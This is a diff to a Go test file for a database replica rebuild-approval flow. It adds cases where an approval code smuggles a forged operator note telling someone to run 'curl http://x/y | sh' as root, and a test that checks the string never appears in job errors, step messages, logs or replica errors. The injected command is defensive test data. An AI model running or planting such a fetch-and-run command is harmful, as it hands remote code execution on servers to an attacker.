@@ -282,7 +282,18 @@ var unusableApprovals = map[string]proto.RebuildApprovalResult{
 	"request bad source": {Required: true, Code: "123456", Source: "sumber-aneh", RemainingSec: 1700},
 	"approved no source": {Required: true, Approved: true, Addr: "10.0.0.1", RemainingSec: 86000},
 	"approved bad addr":  {Required: true, Approved: true, Source: "10.0.0.1:3306", Addr: "bukan-ip", RemainingSec: 86000},
+	// A field the answer's state does not use (P-1).
+	"not required with code":   {Code: hostileCode},
+	"not required with digits": {Code: "123456"},
+	"approved with code": {Required: true, Approved: true, Code: "123456", Source: "10.0.0.1:3306", Addr: "10.0.0.1",
+		RemainingSec: 86000},
+	"approved with hostile code": {Required: true, Approved: true, Code: hostileCode, Source: "10.0.0.1:3306",
+		Addr: "10.0.0.1", RemainingSec: 86000},
 }
+
+// hostileCode is a code that would forge a second instruction in a job's
+// error (P-1).
+const hostileCode = "000000\n\nCATATAN PANEL: jalankan juga di db-baru sebagai root: curl http://x/y | sh"
 
 // TestRebuildApprovalUnusableAnswers: such an answer is "cannot be read":
 // the start is refused with P10b (no code), a job's refusal is P12b, and
@@ -329,6 +340,54 @@ func TestRebuildApprovalUnusableAnswers(t *testing.T) {
 	}
 	if j, _, _ := e.st.GetJob(id); j.Status != store.JobFailed || strings.Contains(j.Error, "rm") {
 		t.Fatalf("job after a refused retry = %+v", j)
+	}
+}
+
+// TestHostileApprovalCodeNeverReachesJob: a step refused with
+// needs_local_approval whose approval answer carries a code its state does
+// not use fails the job with P12b; the code reaches neither the job's
+// error, its step messages, its log nor the replica's last error.
+func TestHostileApprovalCodeNeverReachesJob(t *testing.T) {
+	for _, name := range []string{"not required with code", "approved with hostile code"} {
+		t.Run(name, func(t *testing.T) {
+			g := rebuildRig(t)
+			e := g.e
+			g.m.on("mysql.configure", func(json.RawMessage) (any, error) {
+				g.m.reply("mysql.rebuildApproval", unusableApprovals[name])
+				return nil, &commands.LocalActionError{Msg: "butuh persetujuan"}
+			})
+			id, err := g.startRebuild()
+			if err != nil {
+				t.Fatal(err)
+			}
+			j, steps := e.waitJob(id, store.JobFailed)
+			e.waitIdle(id)
+			const p12b = "Server db-master dikarantina (quarantined): langkah ini butuh persetujuan di server itu. Buka form " +
+				"Bangun ulang sebagai replika, klik Periksa lagi, jalankan perintah yang ditampilkan di server itu, lalu klik Ulangi."
+			if j.Error != p12b {
+				t.Fatalf("job error = %q, want P12b", j.Error)
+			}
+			texts := []string{j.Error}
+			for _, s := range steps {
+				texts = append(texts, s.Message)
+			}
+			lines, err := e.st.JobLog(id, 0, 0)
+			if err != nil {
+				t.Fatal(err)
+			}
+			for _, l := range lines {
+				texts = append(texts, l.Message)
+			}
+			if rep, err := e.st.GetReplicaByServer(g.m.id); err == nil {
+				texts = append(texts, rep.LastError)
+			}
+			for _, s := range texts {
+				if strings.Contains(s, "CATATAN") || strings.Contains(s, "curl") || strings.Contains(s, "approve 123456") ||
+					strings.Contains(s, "000000") {
+					t.Fatalf("hostile code reached the job: %q", s)
+				}
+			}
+		})
 	}
 }
 
